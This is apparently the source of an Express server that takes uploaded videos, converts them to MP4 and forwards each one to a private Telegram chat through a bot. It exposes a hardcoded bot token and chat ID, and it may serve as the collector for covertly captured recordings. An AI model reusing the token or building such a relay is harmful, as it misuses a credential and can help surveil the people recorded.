const express = require("express");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const ffmpeg = require("fluent-ffmpeg");
const path = require("path"); // ✅ ADDED

const app = express();
app.use(cors());

// =====================
// 📁 FILE STORAGE
// =====================
const storage = multer.diskStorage({
    destination: "uploads/",
    filename: (req, file, cb) => {
        const ext = file.originalname.split(".").pop() || "webm";
        cb(null, `${Date.now()}.${ext}`); // ✅ FIXED
    }
});

const upload = multer({ storage });

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
const CHAT_ID = "8280326139";

// =====================
// 🚀 UPLOAD ROUTE
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    let filePath;
    let mp4Path;

    try {
        console.log("\n==============================");
        console.log("🚀 Upload received");

        console.log("REQ FILE:", req.file);

        if (!req.file) {
            console.log("❌ No file uploaded");
            return res.status(400).send("No file uploaded");
        }

        filePath = req.file.path;
        mp4Path = filePath + ".mp4";

        console.log("📁 File path:", filePath);
        console.log("🎥 MIME type:", req.file.mimetype);

        // =====================
        // 🔄 FFmpeg conversion (safe)
        // =====================
        console.log("🔄 Starting FFmpeg conversion...");

        await new Promise((resolve, reject) => {
            ffmpeg(filePath)
                .outputOptions([
                    "-c:v libx264",
                    "-preset ultrafast",
                    "-pix_fmt yuv420p",
                    "-c:a aac"
                ])
                .save(mp4Path)
                .on("start", cmd => {
                    console.log("🎬 FFmpeg command:");
                    console.log(cmd);
                })
                .on("end", () => {
                    console.log("✅ FFmpeg conversion complete");
                    resolve();
                })
                .on("error", err => {
                    console.error("❌ FFmpeg ERROR:", err.message);
                    reject(err);
                });
        });

        console.log("📦 Converted file:", mp4Path);

        // =====================
        // 📤 TELEGRAM UPLOAD
        // =====================
        console.log("📤 Sending to Telegram...");

        const form = new FormData();

        form.append("chat_id", CHAT_ID);

        form.append("video", fs.createReadStream(mp4Path), {
            filename: "specimen.mp4",
            contentType: "video/mp4"
        });

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, // ✅ FIXED
            form,
            { headers: form.getHeaders() }
        );

        console.log("📨 Telegram response:", response.data);

        // =====================
        // 🧹 CLEANUP
        // =====================
        fs.unlinkSync(filePath);
        fs.unlinkSync(mp4Path);

        console.log("🧹 Cleanup done");
        console.log("==============================\n");

        res.send("Upload successful");

    } catch (err) {
        console.error("\n❌ ERROR OCCURRED ❌");

        console.error("Message:", err.message);

        if (err.response?.data) {
            console.error("Telegram/API error:", err.response.data);
        }

        try {
            if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath);
            if (mp4Path && fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
        } catch (cleanupErr) {
            console.error("Cleanup error:", cleanupErr.message);
        }

        res.status(500).send("Failed (check server logs)");
    }
});

// =====================
// 🌐 START SERVER
// =====================
app.listen(3000, () => {
    console.log("Server running on https://hobo-call.onrender.com");
});
